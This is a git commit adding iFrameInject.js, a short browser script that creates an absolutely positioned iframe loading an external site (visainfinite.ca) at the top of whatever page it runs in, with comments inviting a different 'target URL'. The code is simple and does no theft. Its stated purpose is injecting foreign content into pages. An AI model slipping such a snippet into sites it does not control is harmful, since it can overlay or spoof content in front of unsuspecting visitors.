db5cf8c1dc2887a8d5a8f0ded6a2d69e29fb9af5
9x Datakit Network / Substance <jcat42o@gmail.com>
2024-02-24 04:37:14 -0500

    Create iFrameInject.js

---
+++ iFrameInject.js
@@ -0,0 +1,11 @@
+(function() {
+  var iframe = document.createElement('iframe');
+  iframe.style.height = '100px'; // Adjust height as needed
+  iframe.style.width = '100%'; // Adjust width as needed
+  iframe.style.position = 'absolute';
+  iframe.style.top = '0';
+  iframe.src = 'https://visainfinite.ca/'; // Change to your target URL
+  document.body.appendChild(iframe);
+})();
+
+
